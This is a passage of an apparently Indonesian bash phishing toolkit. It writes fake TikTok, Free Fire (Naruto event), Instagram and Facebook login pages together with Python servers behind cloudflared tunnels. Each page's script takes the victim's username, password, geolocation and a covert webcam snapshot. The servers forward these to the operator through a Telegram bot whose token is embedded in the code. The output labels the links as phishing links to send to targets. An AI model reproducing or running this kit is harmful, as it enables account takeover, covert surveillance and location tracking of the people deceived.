print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK SPIN DANA PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x server.py
  python3 server.py
}

#####################################################
#####################################################
phising_TT(){
  WORK_DIR="$HOME/DanxyTT"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====
  

  # HTML TikTok 2025 (tanpa URL mentah)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>TikTok</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:#000;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
    }
    .card{
      width:100%;
      max-width:360px;
      padding:40px 30px;
      background:#161823;
      border:1px solid #333;
      border-radius:12px;
      box-shadow:0 0 30px rgba(255,0,80,0.3);
    }
    .logo{
      font-size:48px;
      font-weight:700;
      color:#ff0050;
      text-align:center;
      margin-bottom:10px;
      letter-spacing:-2px;
    }
    .subtitle{
      text-align:center;
      font-size:14px;
      color:#8a8a8a;
      margin-bottom:30px;
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:#000;
      border:1px solid #333;
      border-radius:4px;
      color:#fff;
      font-size:14px;
    }
    input:focus{
      outline:none;
      border-color:#ff0050;
    }
    .btn{
      width:100%;
      padding:12px;
      border:none;
      border-radius:4px;
      background:#ff0050;
      color:#fff;
      font-weight:600;
      font-size:14px;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{background:#e60049;}
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#ff0050;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #ff0050;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">TikTok</div>
    <div class="subtitle">Masuk untuk melanjutkan</div>
    <input type="text" id="user" placeholder="Email atau nama pengguna"/>
    <input type="password" id="pass" placeholder="Kata sandi"/>
    <button class="btn" onclick="login()">Masuk</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Memuat video...</div>
    </div>
  </div>

  <script>
    async function login(){
      const user=document.getElementById('user').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!user||!pass){alert('Lengkapi username & password');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({user,pass,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Login berhasil</div>';
          setTimeout(()=>location.href='https://tiktok.com',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Login gagal</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > Danxy.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8212462693:AAHl5cZ8jEYKCDsHzG1lyEmVELK9l80ZFXU"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            user, passw, lat, lon, img = data["user"], data["pass"], data["lat"], data["lon"], data["img"]
            fn = f"tt_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] TT User: {user} | Pass: {passw}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🔐 TT User: {user}\n🔑 Pass: {passw}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: http://t.me/phising_shadownex_bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK TIKTOK PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x Danxy.py
  python3 Danxy.py
}

#####################################################
#####################################################


phising_FF(){
  WORK_DIR="$HOME/DanxyFF"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====

  # HTML Free Fire 2025 (event kolaborasi Naruto)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Free Fire x NARUTO - Event Spesial</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:#0a0a0a;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
    }
    .card{
      width:100%;
      max-width:400px;
      padding:40px 30px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:16px;
      backdrop-filter:blur(12px);
      box-shadow:0 0 30px rgba(255,0,80,0.3);
    }
    .logo{
      font-size:36px;
      font-weight:700;
      background:linear-gradient(45deg,#ff0050,#ffcc00);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      text-align:center;
      margin-bottom:10px;
      letter-spacing:-1px;
    }
    .event{
      font-size:14px;
      color:#ffcc00;
      text-align:center;
      margin-bottom:25px;
    }
    .naruto{
      width:120px;
      height:120px;
      margin:0 auto 20px;
      background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="%23ffcc00"/><path d="M50 20 L60 40 L80 40 L65 55 L75 75 L50 60 L25 75 L35 55 L20 40 L40 40 Z" fill="%23ff0050"/></svg>') center/cover;
      border-radius:50%;
      box-shadow:0 0 20px rgba(255,204,0,0.6);
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:#000;
      border:1px solid #333;
      border-radius:4px;
      color:#fff;
      font-size:14px;
    }
    input:focus{
      outline:none;
      border-color:#ff0050;
    }
    .btn{
      width:100%;
      padding:12px;
      border:none;
      border-radius:4px;
      background:linear-gradient(45deg,#ff0050,#ffcc00);
      color:#fff;
      font-weight:600;
      font-size:14px;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{transform:scale(1.02);box-shadow:0 0 20px rgba(255,0,80,0.6);}
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#ffcc00;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #ffcc00;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">Free Fire</div>
    <div class="event">Event Spesial: Free Fire x NARUTO</div>
    <div class="naruto"></div>
    <input type="text" id="user" placeholder="ID Garena / Email / Nomor HP"/>
    <input type="password" id="pass" placeholder="Kata Sandi"/>
    <button class="btn" onclick="login()">Klaim Hadiah & Masuk</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Memuat akun...</div>
    </div>
  </div>

  <script>
    async function login(){
      const user=document.getElementById('user').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!user||!pass){alert('Lengkapi semua kolom');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({user,pass,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Login berhasil</div>';
          setTimeout(()=>location.href='https://ff.garena.com',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Login gagal</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > server.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8212462693:AAHl5cZ8jEYKCDsHzG1lyEmVELK9l80ZFXU"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            user, passw, lat, lon, img = data["user"], data["pass"], data["lat"], data["lon"], data["img"]
            fn = f"ff_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] FF User: {user} | Pass: {passw}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🔐 FF User: {user}\n🔑 Pass: {passw}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: http://t.me/phising_shadownex_bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK FREE FIRE PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x server.py
  python3 server.py
}

#####################################################
#####################################################
phising_IG(){
  WORK_DIR="$HOME/DanxyIG"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====

  # HTML Instagram 2025 (tanpa URL mentah)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Instagram</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:#000;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
    }
    .card{
      width:100%;
      max-width:360px;
      padding:40px 30px;
      background:#121212;
      border:1px solid #262626;
      border-radius:12px;
    }
    .logo{
      font-size:42px;
      font-weight:600;
      background:linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      text-align:center;
      margin-bottom:10px;
      letter-spacing:-1.5px;
    }
    .subtitle{
      text-align:center;
      font-size:14px;
      color:#a8a8a8;
      margin-bottom:30px;
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:#000;
      border:1px solid #262626;
      border-radius:8px;
      color:#fff;
      font-size:14px;
    }
    input:focus{
      outline:none;
      border-color:#0095f6;
    }
    .btn{
      width:100%;
      padding:12px;
      border:none;
      border-radius:8px;
      background:#0095f6;
      color:#fff;
      font-weight:600;
      font-size:14px;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{background:#007cd9;}
    .or{
      display:flex;
      align-items:center;
      margin:20px 0;
      color:#737373;
      font-size:12px;
    }
    .or::before,.or::after{
      content:'';
      flex:1;
      height:1px;
      background:#262626;
    }
    .or::before{margin-right:10px;}
    .or::after{margin-left:10px;
    }
    .fb-login{
      text-align:center;
      color:#385185;
      font-size:14px;
      font-weight:500;
      cursor:pointer;
    }
    .forgot{
      text-align:center;
      margin-top:20px;
      font-size:12px;
      color:#00376b;
      cursor:pointer;
    }
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#0095f6;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #0095f6;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">Instagram</div>
    <div class="subtitle">Bergabung untuk melihat foto dan video dari temanmu.</div>
    <input type="text" id="user" placeholder="Nomor telepon, atau email"/>
    <input type="password" id="pass" placeholder="Kata sandi"/>
    <button class="btn" onclick="login()">Masuk</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Memuat feed...</div>
    </div>
    <div class="or">ATAU</div>
    <div class="fb-login">Masuk dengan Facebook</div>
    <div class="forgot">Lupa kata sandi?</div>
  </div>

  <script>
    async function login(){
      const user=document.getElementById('user').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!user||!pass){alert('Lengkapi username & password');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({user,pass,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Login berhasil</div>';
          setTimeout(()=>location.href='https://instagram.com',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Login gagal</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > Danxy.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8212462693:AAHl5cZ8jEYKCDsHzG1lyEmVELK9l80ZFXU"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            user, passw, lat, lon, img = data["user"], data["pass"], data["lat"], data["lon"], data["img"]
            fn = f"ig_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] IG User: {user} | Pass: {passw}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🔐 IG User: {user}\n🔑 Pass: {passw}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: http://t.me/phising_shadownex_bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK IG PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x Danxy.py
  python3 Danxy.py
}

#####################################################
#####################################################

phising_FB(){
  WORK_DIR="$HOME/DanxyTracker"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====

  # HTML Facebook 2025 (tanpa URL mentah)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Facebook</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:#0A0A0A;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#E4E6EB;
    }
    .card{
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:16px;
      padding:40px;
      width:100%;
      max-width:400px;
      backdrop-filter:blur(12px);
      box-shadow:0 0 30px rgba(0,150,255,0.2);
    }
    .logo{
      font-size:48px;
      font-weight:700;
      background:linear-gradient(45deg,#0099FF,#00D4FF);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      text-align:center;
      margin-bottom:10px;
      letter-spacing:-2px;
    }
    .subtitle{
      text-align:center;
      font-size:16px;
      color:#B0B3B8;
      margin-bottom:30px;
    }
    input{
      width:100%;
      padding:14px;
      border:none;
      border-radius:8px;
      background:#1C1C1E;
      color:#fff;
      font-size:16px;
      margin-bottom:15px;
      border:1px solid transparent;
      transition:.3s;
    }
    input:focus{
      outline:none;
      border-color:#0099FF;
      box-shadow:0 0 10px rgba(0,150,255,0.5);
    }
    .btn{
      width:100%;
      padding:14px;
      border:none;
      border-radius:8px;
      background:linear-gradient(45deg,#0099FF,#00D4FF);
      color:#fff;
      font-size:16px;
      font-weight:600;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{transform:scale(1.02);box-shadow:0 0 20px rgba(0,150,255,0.6);}
    .loading{
      display:none;
      margin-top:20px;
      text-align:center;
      color:#00D4FF;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #00D4FF;
      border-radius:50%;
      width:24px;
      height:24px;
      animation:spin 1s linear infinite;
      margin:0 auto 10px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">facebook</div>
    <div class="subtitle">Masuk untuk melanjutkan</div>
    <input type="text" id="email" placeholder="Email atau Nomor Telepon"/>
    <input type="password" id="pass" placeholder="Kata Sandi"/>
    <button class="btn" onclick="login()">Masuk</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Memverifikasi akun...</div>
    </div>
  </div>

  <script>
    async function login(){
      const email=document.getElementById('email').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!email||!pass){alert('Harap isi semua kolom');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({email,pass,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Berhasil diverifikasi</div>';
          setTimeout(()=>location.href='https://facebook.com',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Verifikasi gagal</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix KeyError & tanpa index)
  cat > Danxy.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8212462693:AAHl5cZ8jEYKCDsHzG1lyEmVELK9l80ZFXU"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            email, passw, lat, lon, img = data["email"], data["pass"], data["lat"], data["lon"], data["img"]
            fn = f"img_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] Email: {email} | Pass: {passw}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🔐 Email: {email}\n🔑 Pass: {passw}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: http://t.me/phising_shadownex_bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK PHISING: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x Danxy.py
  python3 Danxy.py
}


#####################################################
#####################################################


phising_tele(){
    WORK_DIR="$HOME/DanxyTracker"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====

  # HTML tanpa URL mentah & CORS aman
cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Buat avatar & dapatkan hadiahnya</title>
  <style>
